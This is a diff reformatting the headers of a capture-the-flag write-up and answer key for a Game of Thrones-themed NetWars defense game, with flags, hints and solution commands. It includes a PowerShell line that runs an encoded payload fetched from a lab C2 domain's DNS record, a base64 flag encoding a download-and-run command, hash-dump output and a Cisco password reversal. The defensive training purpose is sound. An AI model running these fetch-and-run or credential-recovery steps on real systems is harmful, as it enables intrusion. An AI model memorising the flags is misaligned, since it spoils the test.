@@ -1,6 +1,6 @@
 
 
-#Objective: Intro 
+# Objective: Intro 
 Night Gathers and Now Your Watch Continues
 You are a newly-promoted ranger in the Night's Watch. Your mission: prepare for an imminent visit by Queen Daenerys Targaryen, Breaker of Chains and Protector of the Realm.
 
@@ -43,7 +43,7 @@ The game will run on August 6, 2020 and August 7, 2020 from 1:00pm-9:00pm (1700-
 
 ________________________________________________________________________________________________
 
-##READ CAREFULLY - ANSWERED BY YOU A DAY AGO 1 POINT
+## READ CAREFULLY - ANSWERED BY YOU A DAY AGO 1 POINT
 Please answer "Yes" to confirm that you have carefully read the introduction above.
 
 
@@ -53,8 +53,8 @@ Yes
 
 ________________________________________________________________________________________________
 
-#Objective: Windows 101 
-##NAME THAT OS - ANSWERED BY YOU A DAY AGO 3 POINTS
+# Objective: Windows 101 
+## NAME THAT OS - ANSWERED BY YOU A DAY AGO 3 POINTS
 What is the client operating system that made this request?
 
 GET / HTTP/1.1
@@ -84,7 +84,7 @@ https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions
 
 ________________________________________________________________________________________________
 
-##NAME THAT RID - ANSWERED BY YOU A DAY AGO 3 POINTS
+## NAME THAT RID - ANSWERED BY YOU A DAY AGO 3 POINTS
 What is the RID (Relative Identifier) of the built-in Administrator account on Windows? Answer with a number.
 
 
@@ -111,7 +111,7 @@ WDAGUtilityAccount  S-1-5-21-1552841522-3835366585-4197357653-504
 
 ________________________________________________________________________________________________
 
-##TASKLIST - ANSWERED BY YOU A DAY AGO 3 POINTS
+## TASKLIST - ANSWERED BY YOU A DAY AGO 3 POINTS
 Inspect the (truncated) tasklist output below. What flag was supplied to tasklist to generate this output?
 
 Answer with a '/' followed by a single flag. For example if the flag is 'A', the answer would be: /A
@@ -170,7 +170,7 @@ Note this option:
 
 ________________________________________________________________________________________________
 
-##NETSTAT - ANSWERED BY YOU A DAY AGO 3 POINTS
+## NETSTAT - ANSWERED BY YOU A DAY AGO 3 POINTS
 Inspect the following output. Which netstat command provided the details on the executable that created the network connection?
 
 Active Connections
@@ -229,7 +229,7 @@ Note this option:
 
 ________________________________________________________________________________________________
 
-##NAME THE COMMAND STRING - ANSWERED BY YOU A DAY AGO 4 POINTS
+## NAME THE COMMAND STRING - ANSWERED BY YOU A DAY AGO 4 POINTS
 Inspect the following output. Which Windows command was used to produce this? Note that the output is not suppressed.
 
 Caption=svchost.exe
@@ -293,7 +293,7 @@ To obtain pertinent information about a single specific process, use wmic.exe pr
 
 ________________________________________________________________________________________________
 
-##NAME THAT HASH - ANSWERED BY YOU A DAY AGO 4 POINTS
+## NAME THAT HASH - ANSWERED BY YOU A DAY AGO 4 POINTS
 Analyze the following smart_hashdump output. What hashing technique will be actively used when authenticating users of this system?
 
 [*]     Dumping password hashes...
@@ -320,7 +320,7 @@ Windows uses two hashing algorithms for storing password hashes locally, and eac
 
 ________________________________________________________________________________________________
 
-##SPEAKING OF HASHES... - ANSWERED BY YOU A DAY AGO 5 POINTS
+## SPEAKING OF HASHES... - ANSWERED BY YOU A DAY AGO 5 POINTS
 Enter the name of a well-known tool (with a SHA1 hash of cb58316a65f7fe954adf864b678c694fadceb759) that is designed to extract plaintext passwords, hashes, PIN codes, and kerberos tickets from the memory of a Windows system.
 
 Note: The answer is the name of the tool without any file extension.
@@ -337,7 +337,7 @@ ________________________________________________________________________________
 ________________________________________________________________________________________________
 ________________________________________________________________________________________________
 
-#Objective: Linux 101 
+# Objective: Linux 101 
 ________________________________________________________________________________________________
 
 ##KERNEL RELEASE - ANSWERED BY YOU A DAY AGO 3 POINTS
@@ -350,7 +350,7 @@ uname -r is the correct command.
 ** Flag: 5.0.0-32-generic **
 ________________________________________________________________________________________________
 
-##GROUPS - ANSWERED BY YOU A DAY AGO 3 POINTS 1 INCORRECT ATTEMPT
+## GROUPS - ANSWERED BY YOU A DAY AGO 3 POINTS 1 INCORRECT ATTEMPT
 List the groups that ranger is a part of in alphabetical order with only a comma separating them. The answer is case sensitive. Here would be an example: ranger,users,wireshark
 Hints:
 /etc/passwd will show the user's primary group.
@@ -361,7 +361,7 @@ id ranger | cut -d" " -f3 | grep -Po '\(\K[^)]*' | sort | tr '\n' ',' | sed 's/,
 **Flag: docker,ranger,sudo **
 ________________________________________________________________________________________________
 
-##ESCALATE - ANSWERED BY YOU A DAY AGO 4 POINTS
+## ESCALATE - ANSWERED BY YOU A DAY AGO 4 POINTS
 What is the value of crv in the file /etc/docker/key.json? (Do not include the double quotes!)
 Hints:
 You cannot read this file as a regular user, so sudo will come in handy.
@@ -388,7 +388,7 @@ man shadow and man crypt may prove useful to understand the data represented in 
 https://www.shellhacks.com/linux-generate-password-hash/
 ________________________________________________________________________________________________
 
-##FILE HASH - ANSWERED BY YOU A DAY AGO 3 POINTS
+## FILE HASH - ANSWERED BY YOU A DAY AGO 3 POINTS
 Provide the SHA-1 hash of /home/ranger/background.jpg.
 Hints:
 The tool you need is part of Ubuntu's coreutils package.
@@ -399,7 +399,7 @@ sha1sum /home/ranger/background.jpg | awk '{print $1}'
 
 ________________________________________________________________________________________________
 
-##FILE SYSTEM SEARCH - ANSWERED BY YOU A DAY AGO 4 POINTS 2 INCORRECT ATTEMPTS - 1 POINT LOST
+## FILE SYSTEM SEARCH - ANSWERED BY YOU A DAY AGO 4 POINTS 2 INCORRECT ATTEMPTS - 1 POINT LOST
 There is a docker-compose.yml file somewhere on the filesystem. Where is it? Include the full path to the the docker-compose.yml file. Example: /etc/dockerfiles/docker-compose.yml
 Hints:
 There has to be a command somewhere on the system to help you find things.
@@ -424,9 +424,9 @@ wc -w /opt/elastic/docker-compose.yml
 ________________________________________________________________________________________________
 ________________________________________________________________________________________________
 ________________________________________________________________________________________________
-#Objective: Network 101 
+# Objective: Network 101 
 
-##SUBNET MEMBER - ANSWERED BY YOU A DAY AGO 4 POINTS
+## SUBNET MEMBER - ANSWERED BY YOU A DAY AGO 4 POINTS
 Which of the following IP addresses is a valid host IP within the 10.11.12.0/23 network?
 
 10.11.11.20
@@ -441,7 +441,7 @@ Fill out the form properly at http://www.subnet-calculator.com/subnet.php to fin
 Valid hosts in this subnet are 10.11.12.1 through 10.11.13.254.
 ________________________________________________________________________________________________
 
-##WHO MADE IT? - ANSWERED BY YOU A DAY AGO 4 POINTS
+## WHO MADE IT? - ANSWERED BY YOU A DAY AGO 4 POINTS
 Given the following ifconfig snippet, which vendor most likely produced this network interface card (NIC)?
 
 eth0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
@@ -467,7 +467,7 @@ Wireshark has a local file that maps OUIs to vendor:
 grep -i '00:1b:e9' /usr/share/wireshark/manuf
 ________________________________________________________________________________________________
 
-##ARCHITECTURE DECISION - ANSWERED BY YOU A DAY AGO 4 POINTS 2 INCORRECT ATTEMPTS - 1 POINT LOST
+## ARCHITECTURE DECISION - ANSWERED BY YOU A DAY AGO 4 POINTS 2 INCORRECT ATTEMPTS - 1 POINT LOST
 If you are shopping for a device to provide the capabilities listed below, which is the best product type to shop for.
 
 Prevent attacks using an in-line position on the network using known attack signatures
@@ -509,7 +509,7 @@ The minimum value for the IHL field is 5, which indicates a length of 5 × 32 bi
 **Flag: 20 **
 ________________________________________________________________________________________________
 
-##ENCRYPTED IRC - ANSWERED BY YOU A DAY AGO 3 POINTS
+## ENCRYPTED IRC - ANSWERED BY YOU A DAY AGO 3 POINTS
 Bot herders often use Internet Relay Chat (IRC) to control their bots. What is the well-known TCP port number for IRC if the bot herder chose to use encryption for their IRC communication instead of plaintext?
 
 Hints:
@@ -522,7 +522,7 @@ Both show that Internet Relay Chat via TLS/SSL uses the default port of 6697.
 **Flag: 6697 **
 ________________________________________________________________________________________________
 
-##CISCO HASH - ANSWERED BY YOU A DAY AGO 5 POINTS
+## CISCO HASH - ANSWERED BY YOU A DAY AGO 5 POINTS
 The sole router administrator has mysteriously disappeared, but - luckily - we have a backup copy of the router configuration. Using the snippet below, recover the administrative password so our new ranger can log in to the router.
 
 username benjen password 7 0224084E0E320A20417C061A0E0453
@@ -542,11 +542,11 @@ Go to https://packetlife.net/toolbox/type7/, enter the hash, and click Reverse.
 ________________________________________________________________________________________________
 ________________________________________________________________________________________________
 ________________________________________________________________________________________________
-#Objective: OSINT  
+# Objective: OSINT  
 Please note that Internet and Web access is required to find the answers to the OSINT questions.
 ________________________________________________________________________________________________
 
-##MYSPACE - ANSWERED BY YOU A DAY AGO 5 POINTS 1 INCORRECT ATTEMPT
+## MYSPACE - ANSWERED BY YOU A DAY AGO 5 POINTS 1 INCORRECT ATTEMPT
 The Knight King has set up a myspace account. What is the URL of his profile page? Answer with the full URL including https://.
 Note: The correct Knight King works for the Army of the Dead.
 For example: https://myspace.com/username123
@@ -559,7 +559,7 @@ If you get multiple results, he works for the Army of the Dead, as stated in his
 **Flag: https://myspace.com/knightking888 **
 ________________________________________________________________________________________________
 
-##MORE SOCIAL MEDIA - ANSWERED BY YOU A DAY AGO 5 POINTS
+## MORE SOCIAL MEDIA - ANSWERED BY YOU A DAY AGO 5 POINTS
 The Knight King also appears in another social media platform. Answer with the full URL including https:// of the second social media profile.
 
 For example: https://social-media.com/username123
@@ -574,7 +574,7 @@ Searching for the username knightking888 at https://namechk.com discovers severa
 **Flag: https://twitter.com/knightking888 **
 ________________________________________________________________________________________________
 
-##PASTE - ANSWERED BY YOU A DAY AGO 5 POINTS
+## PASTE - ANSWERED BY YOU A DAY AGO 5 POINTS
 The Knight King mentions a paste on pastebin.com in the second social media page you found. What is the 14th line of that paste? Note that the answer is case sensitive and includes all punctuation.
 
 Hints:
@@ -590,7 +590,7 @@ ________________________________________________________________________________
 #Objective: Linux 201  
 ________________________________________________________________________________________________
 
-##'HIDDEN' FILE - ANSWERED BY YOU A DAY AGO 5 POINTS
+## 'HIDDEN' FILE - ANSWERED BY YOU A DAY AGO 5 POINTS
 There is a 'hidden' file in the ranger account's home directory that contains 11 English words and one special character. The answer is the contents of the file.
 
 Hints:
@@ -602,7 +602,7 @@ To view files with trailing spaces, wrap the filename in quotes, such as cat ". 
 
 ________________________________________________________________________________________________
 
-##SETUID - ANSWERED BY YOU A DAY AGO 5 POINTS
+## SETUID - ANSWERED BY YOU A DAY AGO 5 POINTS
 How many files on your Linux VM have the setuid bit set?
 
 Hints:
@@ -615,7 +615,7 @@ Note that 2>/dev/null sends STDERR (the error messages) to /dev/null, which igno
 **Flag: 82 **
 ________________________________________________________________________________________________
 
-##RECONSTRUCTED FILE - ANSWERED BY YOU A DAY AGO 5 POINTS
+## RECONSTRUCTED FILE - ANSWERED BY YOU A DAY AGO 5 POINTS
 At one time, an attacker had a temporary file on the system that contained a 9 word (with punctuation) string. Use the history file located somewhere in the /home/ranger/Desktop/data directory to reconstruct what that file contained and submit as the case-sensitive answer.
 
 Note that part of your challenge includes identifying the name of the history file.
@@ -627,7 +627,7 @@ Recreate the wildling's steps by running every command except the one on line 13
 **Flag: Chaos is not a pit. Chaos is a ladder. **
 ________________________________________________________________________________________________
 
-##ODD EXECUTABLE - ANSWERED BY YOU A DAY AGO 5 POINTS
+## ODD EXECUTABLE - ANSWERED BY YOU A DAY AGO 5 POINTS
 There is a single executable file somewhere under /var/log. Find it, and the answer is a 14 word (with punctuation), case-sensitive string that is printed when it is executed.
 Hints:
 Remember, directories and symbolic links have executable attributes, so filter those out when you're searching.
@@ -639,7 +639,7 @@ Note that 2>/dev/null sends STDERR (the error messages) to /dev/null, which igno
 
 ________________________________________________________________________________________________
 
-##WILDLING INTELLIGENCE - ANSWERED BY YOU A DAY AGO 10 POINTS
+## WILDLING INTELLIGENCE - ANSWERED BY YOU A DAY AGO 10 POINTS
 Threat intelligence tells us that the wildlings often leave an executable note behind in a file that is EXACTLY 8296 bytes in size AND has the md5 checksum of 4121777a88b99bfdbdfd1930d128478c.
 
 The name of the file often differs, so find and run this executable on your system to receive the flag (case-sensitive and includes punctuation).
@@ -655,7 +655,7 @@ run /opt/yara/extra/codemirror/torment
 
 ________________________________________________________________________________________________
 
-#COMPROMISED PASSWORD - ANSWERED BY YOU A DAY AGO 10 POINTS
+# COMPROMISED PASSWORD - ANSWERED BY YOU A DAY AGO 10 POINTS
 Note: As more breaches happen there is a small chance that more than one hash reports as being compromised. If this is the case, choose the hash with the most compromises.
 Using curl and the pwnedpasswords.com API (https://haveibeenpwned.com/API/v2), which of the following password hashes have been previously compromised in a breach? Answer with the full hash.
 
@@ -697,10 +697,10 @@ for i in $(cat /tmp/hashes.txt); do curl -s https://api.pwnedpasswords.com/range
 ________________________________________________________________________________________________
 ________________________________________________________________________________________________
 ________________________________________________________________________________________________
-#Objective: DNS  
+# Objective: DNS  
 ________________________________________________________________________________________________
 
-##C2 - ANSWERED BY YOU A DAY AGO 10 POINTS
+## C2 - ANSWERED BY YOU A DAY AGO 10 POINTS
 The Wildlings set up a domain at totallynotc2.tk to set up... you guessed it... C2-related DNS records. There is a record at firstmen.totallynotc2.tk that is interesting. What is the data stored in that record? The answer is a base64-encoded string as presented in the DNS record, without any enclosing quotes.
 Hints:
 Use dig.
@@ -710,7 +710,7 @@ The TXT record contains a base64-encoded string.
 **Flag: LgAgAHsAIABpAHcAcgAgAC0AdQBzAGUAYgAgAGgAdAB0AHAAcwA6AC8ALwByAGEAdgBlAG4AcwAuAHQAbwB0AGEAbABsAHkAbgBvAHQAYwAyAC4AdABrAC8AcwBlAHQAdQBwAC0AYwAyAC4AcABzADEAIAB9AAoA **
 ________________________________________________________________________________________________
 
-##POWERSHELL - ANSWERED BY YOU A DAY AGO 10 POINTS 1 INCORRECT ATTEMPT
+## POWERSHELL - ANSWERED BY YOU A DAY AGO 10 POINTS 1 INCORRECT ATTEMPT
 If the following command were executed on a Windows host, which IP address will the machine attempt to download a file from?
 powershell -e $((Resolve-DnsName -Type txt firstmen.totallynotc2.tk).Strings)
 Hints:
@@ -725,7 +725,7 @@ dig -t a ravens.totallynotc2.tk
 
 ________________________________________________________________________________________________
 
-##NAMESERVER - ANSWERED BY YOU A DAY AGO 10 POINTS 1 INCORRECT ATTEMPT
+## NAMESERVER - ANSWERED BY YOU A DAY AGO 10 POINTS 1 INCORRECT ATTEMPT
 What is the IPv6 address of the UK-based, authoritative nameserver for totallynotc2.tk? Answer in the full IPv6 address (NO SHORTHAND).
 
 For example: a result of 2001:abcd:1234:9:8:7:6:101 would be answered as 2001:abcd:1234:0009:0008:0007:0006:0101.
@@ -738,7 +738,7 @@ dig -t AAAA ns-1704.awsdns-21.co.uk gives the answer 2600:9000:5306:a800::1 whic
 **Flag: 2600:9000:5306:a800:0000:0000:0000:0001 **
 ________________________________________________________________________________________________
 
-##WILDLING CERTIFICATES - ANSWERED BY YOU A DAY AGO 10 POINTS
+## WILDLING CERTIFICATES - ANSWERED BY YOU A DAY AGO 10 POINTS
 What is the only CA that the wildlings trust to issue certificates to any totallynotc2.tk systems? Answer with the URL that DNS provides you, not including the double-quotes.
 
 Hints:
@@ -752,10 +752,10 @@ dig -t CAA totallynotc2.tk | grep issue will give you the answer.
 _____________________________________________________________________________________________________
 ________________________________________________________________________________________________
 ___________________________________________________________________________________________
-#Objective: Docker  
+# Objective: Docker  
 ________________________________________________________________________________________________
 
-##CONTAINER IP - ANSWERED BY YOU A DAY AGO 5 POINTS 1 INCORRECT ATTEMPT
+## CONTAINER IP - ANSWERED BY YOU A DAY AGO 5 POINTS 1 INCORRECT ATTEMPT
 What is the IP address of the kibana docker container running in your CyberDefense NetWars VM?
 Hints:
 Docker has some great documentation on how to retrieve data from a running container.
@@ -765,7 +765,7 @@ One way to find the answer is to inspect the container closely.
 **Flag: 172.21.0.5 **
 ________________________________________________________________________________________________
 
-##PID 1 - ANSWERED BY YOU A DAY AGO 10 POINTS 1 INCORRECT ATTEMPT
+## PID 1 - ANSWERED BY YOU A DAY AGO 10 POINTS 1 INCORRECT ATTEMPT
 What is the first argument to the evebox command (running as PID 1) in the evebox container?
 For example: if the command were:
 evebox foobar -i filebeat...
@@ -780,7 +780,7 @@ docker exec -it evebox ps -ef will show you PID 1 and the associated command-lin
 **Flag: server **
 ________________________________________________________________________________________________
 
-##EXPOSED PORTS - ANSWERED BY YOU A DAY AGO 10 POINTS
+## EXPOSED PORTS - ANSWERED BY YOU A DAY AGO 10 POINTS
 What ports are being forwarded from the host to the docker containers running in your CyberDefense NetWars VM? Answer with the port numbers separated by commas and in order from smallest to largest. Example: 80,443,995
 
 Hints:
@@ -794,12 +794,12 @@ docker ps -a | grep -Po "(?<=:)[0-9]+(?=-)" | sort -n | tr '\n' , | sed 's/,$/\n
 ______________________________________________________________________________________________________
 ________________________________________________________________________________________________
 __________________________________________________________________________________________
-#Objective: Zeek  
+# Objective: Zeek  
 The data in /var/log/bro/2019-11-06 was generated by Zeek (formerly known as Bro) and can be used to answer the following series of questions.
 Note that while the project was renamed 'Zeek', tools in your Linux VM still reference 'bro'.
 ________________________________________________________________________________________________
 
-##OUT OF DATE - ANSWERED BY YOU A DAY AGO 5 POINTS
+## OUT OF DATE - ANSWERED BY YOU A DAY AGO 5 POINTS
 Zeek is slightly out of date on your system. Which CVE from 2019 is this version vulnerable to? Answer with the full CVE ID. Example: CVE-2019-11111.
 
 Hints:
@@ -812,7 +812,7 @@ See https://www.cvedetails.com/cve/CVE-2019-12175 and https://github.com/zeek/ze
 **Flag: CVE-2019-12175 **
 ________________________________________________________________________________________________
 
-##EMAIL CHATTER - ANSWERED BY YOU A DAY AGO 10 POINTS
+## EMAIL CHATTER - ANSWERED BY YOU A DAY AGO 10 POINTS
 How many emails were sent on Nov 6th?
 
 Hints:
@@ -824,7 +824,7 @@ zcat /var/log/bro/2019-11-06/smtp.* | grep -v "^#" | wc -l
 **Flag: 221 **
 ________________________________________________________________________________________________
 
-##MAIL COUNT - ANSWERED BY YOU A DAY AGO 10 POINTS
+## MAIL COUNT - ANSWERED BY YOU A DAY AGO 10 POINTS
 Which internal user received the most email on Nov 6th? Answer with their full email address.
 
 Hints:
@@ -835,7 +835,7 @@ zcat /var/log/bro/2019-11-06/smtp.* | bro-cut rcptto | sort | uniq -c | sort -n 
 **Flag: jsnow@nightfort.io **
 ________________________________________________________________________________________________
 
-##MOST REQUESTED DOMAIN - ANSWERED BY YOU A DAY AGO 10 POINTS
+## MOST REQUESTED DOMAIN - ANSWERED BY YOU A DAY AGO 10 POINTS
 What is the most requested DNS query occurring on 11/06/2019? Answer with the resolved name.
 For example: host.example.com
 Hints:
@@ -846,7 +846,7 @@ zcat /var/log/bro/2019-11-06/dns.* | bro-cut query | sort | uniq -c | sort -rn |
 **Flag: go.microsoft.com **
 ________________________________________________________________________________________________
 
-##STRANGE CLOUDS - ANSWERED BY YOU A DAY AGO 10 POINTS
+## STRANGE CLOUDS - ANSWERED BY YOU A DAY AGO 10 POINTS
 The Night's Watch Suricata incorrectly alerted on 40 DNS queries for a .cloud Top Level Domain (TLD). How many queries did Zeek see for FQDNs within the .cloud TLD?
 Hints:
 Zeek's DNS logs will come in handy yet again.
@@ -856,7 +856,7 @@ zcat /var/log/bro/2019-11-06/dns.* | bro-cut query | grep "\.cloud$" | wc -l wil
 **Flag: 42 **
 ________________________________________________________________________________________________
 
-##LONGEST FQDN - ANSWERED BY YOU A DAY AGO 10 POINTS
+## LONGEST FQDN - ANSWERED BY YOU A DAY AGO 10 POINTS
 What is the longest FQDN requested on 11/06/2019?
 Hints:
 Grab all queries from Zeek's DNS logs and sort by length.
@@ -868,10 +868,10 @@ zcat /var/log/bro/2019-11-06/dns.* | bro-cut query | sort -u | awk '{print lengt
 ________________________________________________________________________________________________
 ________________________________________________________________________________________________
 ________________________________________________________________________________________________
-#Objective: Suricata  
+# Objective: Suricata  
 ________________________________________________________________________________________________
 
-##CONFIGURATION FILE - ANSWERED BY YOU A DAY AGO 5 POINTS
+## CONFIGURATION FILE - ANSWERED BY YOU A DAY AGO 5 POINTS
 What is Suricata's main configuration file on your CyberDefense NetWars system? Answer with the full canonical path.
 Hints:
 The Suricata man page can identify the standard configuration file name.
@@ -882,7 +882,7 @@ Use suricata -T to identify the configuration file name /etc/suricata//suricata.
 
 ________________________________________________________________________________________________
 
-##HOME_NET - ANSWERED BY YOU A DAY AGO 5 POINTS
+## HOME_NET - ANSWERED BY YOU A DAY AGO 5 POINTS
 Which subnet ranges are configured for HOME_NET? Include EXACTLY as configured in suricata's config file and include the double-quotes.
 For example, HOME_NET: "[10.0.0.0/8,172.16.0.0/12]" would yield the result:
 "[10.0.0.0/8,172.16.0.0/12]".
@@ -895,7 +895,7 @@ sudo grep "^\s*HOME_NET:" /etc/suricata/suricata.yaml | awk '{print $2}' will yi
 **Flag: "[192.168.0.0/16,10.0.0.0/8,172.16.0.0/12]" **
 ________________________________________________________________________________________________
 
-##SUCCESSFUL RULES - ANSWERED BY YOU A DAY AGO 10 POINTS 1 INCORRECT ATTEMPT
+## SUCCESSFUL RULES - ANSWERED BY YOU A DAY AGO 10 POINTS 1 INCORRECT ATTEMPT
 If Suricata were started on your CyberDefense NetWars VM using the configuration file you found earlier, how many rules would be successfully loaded?
 Hints:
 You can use suricata to Test the configuration.
@@ -906,7 +906,7 @@ sudo suricata -Tv 2>/dev/null | grep successfully will show you the answer.
 ________________________________________________________________________________________________
 ________________________________________________________________________________________________
 ________________________________________________________________________________________________
-#Objective: Level 3 README   
+# Objective: Level 3 README   
 For many of the upcoming questions, you will need to utilize data stored in the following tools installed in your CyberDefense NetWars VM:
 
 Kibana
@@ -918,7 +918,7 @@ You can find out more about these tools by opening Firefox and viewing the homep
 Note that level one and two questions had full hints. Level three questions have one hint, which is a nudge in the right direction.
 ________________________________________________________________________________________________
 
-##ACKNOWLEDGE - ANSWERED BY YOU A DAY AGO 1 POINT
+## ACKNOWLEDGE - ANSWERED BY YOU A DAY AGO 1 POINT
 I have read the Level 3 README.
 
 
@@ -926,12 +926,12 @@ I have read the Level 3 README.
 ________________________________________________________________________________________________
 ________________________________________________________________________________________________
 ________________________________________________________________________________________________
-#Objective: Red Alert   
+# Objective: Red Alert   
 Evebox, Kibana, and all PCAPs in /home/ranger/Desktop/data that start with capture can be used to answer this series of questions.
 
 ________________________________________________________________________________________________
 
-##HIGH SEVERITY IP - ANSWERED BY YOU A DAY AGO 5 POINTS
+## HIGH SEVERITY IP - ANSWERED BY YOU A DAY AGO 5 POINTS
 Which internal IP address had 4 high severity alerts occurring at the exact same second?
 Hints:
 Evebox is most helpful.
@@ -939,7 +939,7 @@ Evebox is most helpful.
 **Flag: 10.20.30.211 **
 ________________________________________________________________________________________________
 
-##WHITE WALKER IP - ANSWERED BY YOU A DAY AGO 5 POINTS
+## WHITE WALKER IP - ANSWERED BY YOU A DAY AGO 5 POINTS
 What is the attacking IP address that launched the attack against 10.20.30.211?
 Hints:
 The answer can be found by looking at the same 4 alerts from the last question.
@@ -947,7 +947,7 @@ The answer can be found by looking at the same 4 alerts from the last question.
 **Flag: 180.168.133.128 **
 ________________________________________________________________________________________________
 
-##NOT NAMED AFTER BLUE TEAM - ANSWERED BY YOU A DAY AGO 5 POINTS
+## NOT NAMED AFTER BLUE TEAM - ANSWERED BY YOU A DAY AGO 5 POINTS
 According to Suricata, what is the name of the exploit that was launched against 10.20.30.211? Answer with a single word, no spaces.
 Hints:
 It is the only exploit name in all 4 high severity alerts.
@@ -956,7 +956,7 @@ It is the only exploit name in all 4 high severity alerts.
 
 ________________________________________________________________________________________________
 
-##TARGET PORT - ANSWERED BY YOU A DAY AGO 5 POINTS
+## TARGET PORT - ANSWERED BY YOU A DAY AGO 5 POINTS
 Which TCP port did the exploit target on 10.20.30.211?
 Hints:
 The exploit targets an implementation of the Server Message Block protocol.
@@ -965,7 +965,7 @@ The exploit targets an implementation of the Server Message Block protocol.
 
 ________________________________________________________________________________________________
 
-##VICTIM HOSTNAME - ANSWERED BY YOU A DAY AGO 10 POINTS 1 INCORRECT ATTEMPT
+## VICTIM HOSTNAME - ANSWERED BY YOU A DAY AGO 10 POINTS 1 INCORRECT ATTEMPT
 What is the hostname of 10.20.30.211? Answer does NOT include the domain (example: WKSTN-01)
 
 Hints:
@@ -975,7 +975,7 @@ Search for "10.20.30.211" or "180.168.133.128" in Kibana.
 
 ________________________________________________________________________________________________
 
-##WHITE WALKER CALLBACK - ANSWERED BY YOU A DAY AGO 10 POINTS 6 INCORRECT ATTEMPTS - 3 POINTS LOST
+## WHITE WALKER CALLBACK - ANSWERED BY YOU A DAY AGO 10 POINTS 6 INCORRECT ATTEMPTS - 3 POINTS LOST
 The white walker was able to get 10.20.30.211 to call back over a very suspicious TCP port. What was the port number that the victim connected back to?
 Hints:
 Search for alerts related to these hosts but after the initial attack.
@@ -984,7 +984,7 @@ Search for alerts related to these hosts but after the initial attack.
 
 ________________________________________________________________________________________________
 
-##PERSISTENCE USERNAME - ANSWERED BY YOU A DAY AGO 10 POINTS 1 INCORRECT ATTEMPT
+## PERSISTENCE USERNAME - ANSWERED BY YOU A DAY AGO 10 POINTS 1 INCORRECT ATTEMPT
 The white walker creates a new user account on 10.20.30.211 for persistence. What is the name of this account?
 Hints:
 You will need Wireshark and one of the captures for this one.
@@ -992,7 +992,7 @@ You will need Wireshark and one of the captures for this one.
 **Flag: littlefinger **
 ________________________________________________________________________________________________
 
-##PERSISTENCE PASSWORD - ANSWERED BY YOU A DAY AGO 10 POINTS
+## PERSISTENCE PASSWORD - ANSWERED BY YOU A DAY AGO 10 POINTS
 What is the password that was created for a new user account created by the white walker on 10.20.30.211?
 Hints:
 Answer should be in the same Wireshark capture as the previous answer.
@@ -1003,7 +1003,7 @@ Li3sAndDecepti0n was not on this IP address
 
 ________________________________________________________________________________________________
 
-##PERSISTENCE PROTOCOL - ANSWERED BY YOU 7 HOURS AGO 10 POINTS 18 INCORRECT ATTEMPTS - 3 POINTS LOST
+## PERSISTENCE PROTOCOL - ANSWERED BY YOU 7 HOURS AGO 10 POINTS 18 INCORRECT ATTEMPTS - 3 POINTS LOST
 Now that an account is set up for the attacker on 10.20.30.211, which application protocol does the attacker use to connect for a more reliable connection? Answer is the protocol's acronym. For example, if the application protocol is File Transfer Protocol, the answer would be FTP.
 Hints:
 Wireshark Statistics should help you find the protocol used for persistence.
@@ -1012,7 +1012,7 @@ Wireshark Statistics should help you find the protocol used for persistence.
 
 ________________________________________________________________________________________________
 
-##MESSAGE - ANSWERED BY YOU 6 HOURS AGO 15 POINTS
+## MESSAGE - ANSWERED BY YOU 6 HOURS AGO 15 POINTS
 What is the last full sentence of the message that the white walker left on 10.20.30.211? Include all punctuation.
 Hints:
 If you have the user name and host name of the victim, do a search in Kibana for both of those.
@@ -1027,11 +1027,11 @@ LAST full sentence: **I beg you: come to King’s Landing, swear fealty to King 
 ________________________________________________________________________________________________
 ________________________________________________________________________________________________
 ________________________________________________________________________________________________
-#Objective: Go Phish!   
+# Objective: Go Phish!   
 Zeek logs (/var/log/bro), Kibana, and all PCAPs in /home/ranger/Desktop/data that start with capture can be used to answer this series of questions.
 ________________________________________________________________________________________________
 
-##COUSIN DOMAIN - ANSWERED BY YOU 8 HOURS AGO 10 POINTS
+## COUSIN DOMAIN - ANSWERED BY YOU 8 HOURS AGO 10 POINTS
 A member of the Night's Watch received a phishing email and they mistakenly followed its directions. They could have sworn that the email came from their domain (nightfort.io), but white walkers like to use cousin domains. What was the sender's email address that sent the phishing email?
 
 Hints:
@@ -1041,7 +1041,7 @@ Cousin domains look, by the naked eye, very similar to a valid email address tha
 ipaddr == 171.80.16.171
 ________________________________________________________________________________________________
 
-##PHISHED HOST - ANSWERED BY YOU 8 HOURS AGO 10 POINTS
+## PHISHED HOST - ANSWERED BY YOU 8 HOURS AGO 10 POINTS
 Which internal host followed the instructions of the phishing email? Answer with the hostname (without the domain). Example: WKSTN-01
 Hints:
 Find the relevant PCAP by searching for the phishing email address identified in the previous question.
@@ -1052,7 +1052,7 @@ Once you find the relevant capture, find the phishing email and then search the 
 
 ________________________________________________________________________________________________
 
-##WHITE WALKER PORT - ANSWERED BY YOU 7 HOURS AGO 10 POINTS 2 INCORRECT ATTEMPTS - 1 POINT LOST
+## WHITE WALKER PORT - ANSWERED BY YOU 7 HOURS AGO 10 POINTS 2 INCORRECT ATTEMPTS - 1 POINT LOST
 When the victim follows the phishing email's instructions, it connects back to the white walker on which port?
 Hints:
 The same host that sent the email is also the one that the victim connected back to.
@@ -1061,7 +1061,7 @@ The same host that sent the email is also the one that the victim connected back
 
 ________________________________________________________________________________________________
 
-##WHAT'S MY NAME AGAIN? - ANSWERED BY YOU 7 HOURS AGO 10 POINTS
+## WHAT'S MY NAME AGAIN? - ANSWERED BY YOU 7 HOURS AGO 10 POINTS
 What is the first command that the white walker runs once the phishing victim's machine connects back?
 Hints:
 If you found the White Walker Port, follow that stream.
@@ -1070,7 +1070,7 @@ If you found the White Walker Port, follow that stream.
 
 ________________________________________________________________________________________________
 
-##SHIELDS OFF - ANSWERED BY YOU 7 HOURS AGO 10 POINTS
+## SHIELDS OFF - ANSWERED BY YOU 7 HOURS AGO 10 POINTS
 What application does the white walker disable on the phishing victim's machine?
 
 
@@ -1086,7 +1086,7 @@ If you found the White Walker Port, follow that stream. The second command issue
 
 ________________________________________________________________________________________________
 
-##GRAB THE HASHES - ANSWERED BY YOU 7 HOURS AGO 10 POINTS
+## GRAB THE HASHES - ANSWERED BY YOU 7 HOURS AGO 10 POINTS
 Additional malware is downloaded and run against the phishing victim's machine to gather password hashes. What is the name of the compressed file written to the victim system?
 Hints:
 If you found the White Walker Port, follow that stream.
@@ -1095,7 +1095,7 @@ If you found the White Walker Port, follow that stream.
 
 ________________________________________________________________________________________________
 
-##JON'S PASSWORD - ANSWERED BY YOU 7 HOURS AGO 20 POINTS
